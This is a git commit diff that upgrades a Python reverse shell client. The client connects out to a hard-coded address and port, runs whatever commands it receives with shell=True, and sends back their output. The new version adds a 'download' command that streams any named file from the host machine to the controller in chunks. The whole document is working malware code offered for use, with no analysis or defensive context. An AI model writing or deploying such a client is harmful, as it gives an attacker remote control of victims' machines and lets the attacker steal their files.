150f994ec1863f63047bff92b2ab3271d78952f4
AGNEESHWARAN <32772085+AGNEESHWARAN@users.noreply.github.com>
2025-09-09 01:33:01 +0530

    revershell client v3 upgrade

--- reverse_shell_client.py
+++ reverse_shell_client.py
@@ -2,38 +2,80 @@ import subprocess,socket,os
 
 s=socket.socket()
 
-def connect_serv():
-	try:
-		s.connect(('127.0.0.1',40001))
-	except:
-		print("reconnecting!!")
-		connect_serv()
+class reverse_shell_client:
+    def __init__(self):
+        try:
+            s.connect(('192.168.1.18', 40029))
+        except:
+            print("reconnecting!!")
 
-connect_serv()
-while True:
-	message = ">>"
-	data = s.recv(20480).decode("utf-8")
-	try:
-		if data.strip().startswith('cd '):
-			new_path = data[3:].strip()
-			if new_path:
-				os.chdir(new_path)
+    def change_dir(self, new_path):
+        try:
+            os.chdir(new_path)
+            return f"Changed directory to: {os.getcwd()}"
+        except OSError as e:
+            return f"Error changing directory: {str(e)}"
 
-				message = str.encode(f"Changed directory to: {os.getcwd()}")
-			else:
-				message = str.encode("Error: No directory specified")
-	except OSError as e:
-		message = str.encode(f"Error changing directory: {str(e)}")
-	try:
-		if len(data) > 0:
-			cmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-			output_byte = cmd.stdout.read() + cmd.stderr.read()
-			output_str = str(output_byte,"utf-8")
-			currentWD = os.getcwd() + "> "
+    def controlled_exec(self, command):
+        try:
+            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte, "utf-8")
+            currentWD = os.getcwd() + "> "
+            return output_str + currentWD
+        except Exception as e:
+            return "Error executing command: " + str(e)
 
-			message = str.encode(output_str + currentWD)
+    def console(self):
+        while True:
+            data = s.recv(20480).decode("utf-8")
+            if data.strip().startswith('cd '):
+                new_path = data[3:].strip()
+                if new_path:
+                    message = self.change_dir(new_path)
+                else:
+                    message = "Error: No directory specified"
+            elif data.strip().startswith('download ') or data.strip().startswith('dl ') :
+                filename = data.split(' ', 1)[1].strip()
+                if os.path.isfile(filename):
+                    self.download_file(filename)
+                    continue
+                else:
+                    message = "Error: File not found"
+            else:
+                message = self.controlled_exec(data)
+            s.send(str.encode(message))
 
-	except Exception as e:
-		message = str.encode("Error executing command: " + str(e))
-	finally:
-		s.send(message)
+    def download_file(self, filename):
+        try:
+            file_size = os.path.getsize(filename)
+
+            s.sendall(f"FILE_SIZE:{file_size}".encode())
+
+            with open(filename, "rb") as f:
+                file_data = f.read()
+                chunk_size = 4096
+                start = 0
+
+                # Send file in chunks
+                while start < file_size:
+                    end = min(start + chunk_size, file_size)
+                    chunk = file_data[start:end]
+                    status = s.recv(20480).decode("utf-8")
+                    if status != "READY":
+                        s.sendall(b"ABORT")
+                        return
+                    elif status == "READY":
+                        s.sendall(chunk)
+                    start = end
+
+                s.sendall(b"EOF")
+        except Exception as e:
+            s.sendall(str.encode(f"Error reading file: {str(e)}"))
+
+    def close_connection(self):
+        s.close()
+    def run(self):
+        self.console()
+
+reverse_shell_client().run()
